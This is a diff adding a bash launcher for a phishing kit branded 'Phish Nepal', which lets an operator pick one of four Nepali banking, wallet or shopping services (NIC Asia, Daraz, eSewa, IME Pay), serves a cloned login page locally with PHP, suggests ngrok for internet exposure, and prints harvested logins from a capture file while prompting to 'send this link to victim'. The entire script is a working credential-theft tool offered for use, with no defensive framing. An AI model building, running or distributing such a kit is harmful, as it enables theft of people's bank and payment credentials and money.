@@ -1,0 +1,99 @@
+#!/bin/bash
+echo "[*] DEPENDENCIES NOT INSTALLED  [*]"
+command -v php > /dev/null 2>&1 || { echo >&2 "[*] I require php but it's not installed | running install"; sudo apt install php -y; }
+command -v ruby > /dev/null 2>&1 || { echo >&2 "[*] I require ruby but it's not installed | running install "; sudo apt install ruby -y; }
+command -v gem > /dev/null 2>&1 || { echo >&2 "[*] I require gem but it's not installed | running install"; sudo apt install gem -y; }
+command -v lolcat > /dev/null 2>&1 || { echo >&2 "[*] I require lolcat but it's not installed | running install"; sudo gem install lolcat; }
+clear
+sudo clear
+echo "                 (,..         ,.*/"
+echo "            ,.  ...,,,,,,,,,,,,,/**  ,*"
+echo "         ,. ,*,*.,,,,**,...,,*,**,*/,/* ,*"
+echo "       * *,*.,,,,.*.,/, .,  ,/*,*,,*.,,,*/ *"
+echo "     , *, , .  /***,,*,/** /,.,.,*,,,., , ., *"
+echo "    *.*, ,, ,,,,,*,,,*,**./..,,**,,*,,, *, ,. /"
+echo "   *,, , * ***,,*.,,**,*( *..,.,//,**/.* , . .,,"
+echo "  , .. . .,**/*(%((##( .* (* *,/..*,,,,,,  . *. ."
+echo "  ,,,.. ,.,*(/(##,     (, **     ,***.**,.. . ,,, "
+echo "  *,,  * (,/**,*,       * /*      ,..**,/( *  ... "
+echo "  *.,*  ( ,.,/*,,       ***       ,,*./** ,(/.( . "
+echo " ., ,, ,. .,,*,,,       ***       *...**, *  ., /."
+echo "   . , , *, ,.*(,        *        //**  .  ,/, ,  "
+echo "    , *(  ** . *%#/      *      ,*,* , *   *, ,. "
+echo "      / ,,#,,  , **      *      /  * (*,,/. ,  "
+echo "        ( (,,.,,,**      *      ./*////,* ,   "
+echo "          #* */.(.*.     *     ,//.,*, ,.    "
+echo "            , ,%  */     *     *,  .,       "
+echo "                  *   **,,,,,   , "
+echo ""
+
+
+
+echo "       [*] PHISH NEPAL BY GREYHATNEPAL [*]"|lolcat
+echo "     [*] https://greyhatnepal.github.io [*]"|lolcat
+echo "     **************************************"|lolcat
+echo ""
+echo "                    OPTIONS :"|lolcat
+echo ""
+sudo rm -rf tmp/*
+echo "     | 1 : nic-asia | 2 : daraz | 3 : esewa | 4 : ime-pay |" |lolcat
+echo ""
+read -p "[*] ENTER THE NUMBER YOU WANT TO PHISH :> " input1
+
+if [ $input1 = 1 ]
+then
+ sudo cp -r web/nicasia/* tmp/
+ cd tmp
+ touch capture.txt
+ sudo php -S localhost:80 &
+ while true; do
+  echo "[*] WAITING FOR LOGIN : send this link to victim : http://localhost:80 | or | (use : ngrok http 80) for W.A.N [*]"
+  cat capture.txt
+  sleep 3
+  clear
+  done
+
+elif [ $input1 = 2 ]
+then
+ sudo cp -r web/daraz/* tmp/
+ cd tmp
+ touch capture.txt
+ sudo php -S localhost:80 &
+ while true; do
+  echo "[*] WAITING FOR LOGIN : send this link to victim : http://localhost:80 | or | (use : ngrok http 80) for W.A.N [*]"
+  cat capture.txt
+  sleep 3
+  clear
+  done
+
+elif [ $input1 = 3 ]
+then
+ sudo cp -r web/esewa/* tmp/
+ cd tmp
+ touch capture.txt
+ sudo php -S localhost:80 &
+ while true; do
+  echo "[*] WAITING FOR LOGIN : send this link to victim : http://localhost:80 | or | (use : ngrok http 80) for W.A.N [*]"
+  cat capture.txt
+  sleep 3
+  clear
+  done
+
+elif [ $input1 = 4 ]
+then
+ sudo cp -r web/imepay/* tmp/
+ cd tmp
+ touch capture.txt
+ sudo php -S localhost:80 &
+ while true; do
+  echo "[*] WAITING FOR LOGIN : send this link to victim : http://localhost:80 | or | (use : ngrok http 80) for W.A.N [*]"
+  cat capture.txt
+  sleep 3
+  clear
+  done
+
+else
+echo "[*] WRONG INPUT !! [*]"
+exit
+fi
+
